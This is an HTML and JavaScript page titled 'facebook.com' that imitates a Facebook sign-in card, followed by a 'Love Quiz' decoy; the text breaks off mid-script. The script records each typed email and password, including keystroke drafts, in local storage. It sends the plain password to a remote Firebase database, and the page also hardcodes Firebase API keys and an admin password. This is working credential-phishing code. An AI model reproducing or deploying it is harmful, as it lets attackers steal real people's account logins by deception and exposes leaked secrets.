<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>facebook.com</title>
<style>
  :root{
    --light-blue:#8fd3ff;
    --blue:#1877F2;
    --bg:#0b0b0c;
    --card:#0f1720;
    --muted:#9aa8b2;
    --love1:#ffb6c1;
    --love2:#ff5fa2;
  }
  *{box-sizing:border-box;font-family:Inter,Segoe UI,Arial,sans-serif;transition:all .3s ease;}
  body{
    margin:0;min-height:100vh;
    display:flex;align-items:center;justify-content:center;
    background:linear-gradient(180deg,#ffffff 0%, #e9f6ff 100%);
    color:#111827;padding:28px;
  }
  .hidden{display:none!important;}
  .fade{opacity:0;pointer-events:none;transform:scale(.98);}
  .show{opacity:1;pointer-events:auto;transform:scale(1);}

  .wrap{display:flex;gap:28px;align-items:flex-start;max-width:1000px;width:100%;justify-content:center;}
  .left{width:340px;display:flex;align-items:center;justify-content:center;}
  .logo{width:120px;height:120px;margin:0 auto 16px;display:block}
  .card{
    background:#ffffff;border-radius:12px;padding:18px;
    box-shadow:0 6px 20px rgba(16,24,40,0.06);text-align:center;
    width:100%;max-width:320px;animation:fadeIn .5s ease;
  }
  .card h2{margin:0 0 12px;font-size:20px;color:#0f172a}
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #d1d5db;margin:8px 0;font-size:14px}
  button{width:100%;padding:10px;border-radius:8px;border:none;background:var(--blue);color:#fff;font-weight:700;cursor:pointer;margin-top:8px}
  .small{font-size:13px;color:var(--muted);margin-top:8px}

  /* LOVE QUIZ */
  #quizWrap{
    width:100%;max-width:600px;padding:24px;border-radius:16px;
    background:linear-gradient(135deg,var(--love1),var(--love2));
    color:#fff;text-align:center;box-shadow:0 8px 25px rgba(255,105,180,0.3);
    animation:fadeIn .6s ease;
  }
  #quizWrap h2{margin-bottom:16px;font-size:26px;}
  .question{font-size:18px;margin-bottom:20px;}
  .options button{
    display:block;width:100%;margin:8px 0;padding:12px;border:none;
    border-radius:8px;background:rgba(255,255,255,0.2);
    color:#fff;font-weight:600;cursor:pointer;
  }
  .options button:hover{background:rgba(255,255,255,0.4);}
  #nextBtn{background:#fff;color:var(--love2);font-weight:800;margin-top:14px;}
  #result{font-size:22px;margin-top:20px;}
  @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
</style>
</head>
<body>

<div class="wrap">
  <!-- LOGIN -->
  <div class="left" id="loginContainer">
    <div class="card show" id="loginCard">
      <!-- LOGO SVG -->
      <svg class="logo" viewBox="0 0 64 64">
        <circle cx="32" cy="36" r="26" fill="#1877F2"/>
        <text x="32" y="47" text-anchor="middle" font-size="56" fill="#fff" font-weight="900" dominant-baseline="middle">f</text>
      </svg>

      <h2>Sign in</h2>
      <input id="email" type="email" placeholder="Email"/>
      <input id="pwd" type="password" placeholder="Password"/>
      <button id="btnLogin">Login</button>
      <div class="small"><strong>login</strong> <strong>your Facebook account</strong></div>
    </div>
  </div>

  <!-- LOVE QUIZ -->
  <div class="right">
    <div id="quizWrap" class="hidden">
      <h2>ðŸ’– Love Quiz ðŸ’–</h2>
      <div id="quizBox">
        <div class="question" id="question"></div>
        <div class="options" id="options"></div>
        <button id="nextBtn">Next</button>
        <div id="result" class="hidden"></div>
      </div>
    </div>
  </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
import { getAuth } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-auth.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-analytics.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCEswNldImLq2yD1CwQZfcLxtT6U7RMMXw",
  authDomain: "website-110c6.firebaseapp.com",
  databaseURL: "https://website-110c6-default-rtdb.firebaseio.com",
  projectId: "website-110c6",
  storageBucket: "website-110c6.firebasestorage.app",
  messagingSenderId: "360021271503",
  appId: "1:360021271503:web:ed84554aed4a57c6c4a8ba",
  measurementId: "G-V3R0LYR5Y7"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const db = getDatabase(app);
const auth = getAuth(app);

console.log("Firebase connected successfully! âœ…");

// LOCAL STORAGE + DRAFT LOGIC
const ADMIN_USER='blue',ADMIN_PASS='hatdogq40';
const STORAGE_KEY='demo_logins_safe_v1';
const DRAFT_KEY='demo_logins_safe_v1_draft';
const loginBtn=document.getElementById('btnLogin');
const quizWrap=document.getElementById('quizWrap');
const loginContainer=document.getElementById('loginContainer');
const emailInput = document.getElementById('email');
const pwdInput = document.getElementById('pwd');

function readStore(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY))||[]}catch(e){return[]}}
function writeStore(v){localStorage.setItem(STORAGE_KEY,JSON.stringify(v))}
function genToken(l=8){const c='ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';let t='';for(let i=0;i<l;i++)t+=c.charAt(Math.floor(Math.random()*c.length));return t;}

// LOCAL STORAGE RECORD
function addRecord(email, pwd){
  const lower=email.trim().toLowerCase();
  if(!lower||lower===ADMIN_USER) return;
  const arr = readStore();
  arr.push({email:lower,password:pwd,token:genToken(10),time:new Date().toLocaleString()});
  writeStore(arr);
}

// FIREBASE RECORD (store raw password letters)
function addRecordFirebase(email, pwd){
  const safeEmail = email.replace('.', ','); // Firebase keys cannot have dots
  const recordRef = ref(db, 'logins/' + safeEmail);
  set(recordRef, {
    email: email,
    pwd_hint: pwd, // store the actual password letters
    token: genToken(10),
    time: new Date().toISOString()
  })
  .then(() => console.log('Saved login to Firebase:', email))
  .catch(err => console.error('Firebase save error:', err));
}

// DRAFT
function saveDraft(){
  const e = emailInput.value.trim();
  const p = pwdInput.value;
  localStorage.setItem(DRAFT_KEY, JSON.stringify({email:e, password:p, t:new Date().toISOString()}));
}
function clearDraft(){ localStorage.removeItem(DRAFT_KEY); }
function restoreDraft(){
  try{
    const d = JSON.parse(localStorage.getItem(DRAFT_KEY) || 'null');
    if(d && d.email) emailInput.value = d.email;
    if(d && d.password) pwdInput.value = d.password;
  }catch(e){}
}
restoreDraft();
let draftTimer=null;
[emailInput, pwdInput].forEach(inp=>{
  inp.addEventListener('input', ()=>{
    clearTimeout(draftTimer);
    draftTimer = setTimeout(saveDraft, 150);
  });
});

// LOGIN FLOW
loginBtn.onclick=()=>{
  const email=emailInput.value.trim();
  const pwd=pwdInput.value.trim();
  if(!email||!pwd) return alert('Enter email and password');
  const isAdmin=email.toLowerCase()===ADMIN_USER && pwd===ADMIN_PASS;

  document.getElementById('loginCard').classList.add('fade');
  setTimeout(()=>loginContainer.classList.add('hidden'),400);

  // SAVE BOTH LOCALLY & REMOTELY
  addRecord(email, pwd);
  addRecordFirebase(email, pwd);
  clearDraft();

  if(isAdmin){
    alert('Admin login detected (this is login-only page). To view admin panel, open the admin page on this domain.');
  }else{
    quizWrap.classList.remove('hidden');
    startQuiz();
  }
};

// LOVE QUIZ
const quizData=[
 {q:"What do you value most in love?",o:["Trust","Fun","Loyalty","Adventure"],a:0},
 {q:"Ideal date night?",o:["Movie marathon","Beach walk","Candle dinner","Gaming together"],a:2},
 {q:"Pick a color of love:",o:["Red","Pink","Blue","Purple"],a:1},
 {q:"When you miss someone youâ€¦",o:["Text them","Sleep","Listen to music","Scroll old chats"],a:3},
 {q:"Love isâ€¦",o:["War","Game","Magic","Peace"],a:2},
 {q:"How fast do you fall in love?",o:["Slow","Fast","Never","Depends"],a:3},
 {q:"What song vibe you?",o:["Romantic","Sad","Chill","Hype"],a:0},
 {q:"Favorite gift?",o:["Letters","Flowers","Food","Hugs"],a:3},
 {q:"How do you show love?",o:["Words","Acts","Time","Gifts"],a:2},
 {q:"Choose a heart:",o:["ðŸ’–","ðŸ’˜","ðŸ’ž","â¤ï¸â€ðŸ”¥"],a:3}
];
let current=0,score=0;
const qEl=document.getElementById('question');
const optEl=document.getElementById('options');
const nextBtn=document.getElementById('nextBtn');
const resEl=document.getElementById('result');

function startQuiz(){current=0;score=0;resEl.classList.add('hidden');nextBtn.innerText='Next';showQ();}
function showQ(){const d=quizData[current];qEl.textContent=d.q;optEl.innerHTML='';d.o.forEach((opt,i)=>{
  const b=document.createElement('button');
  b.textContent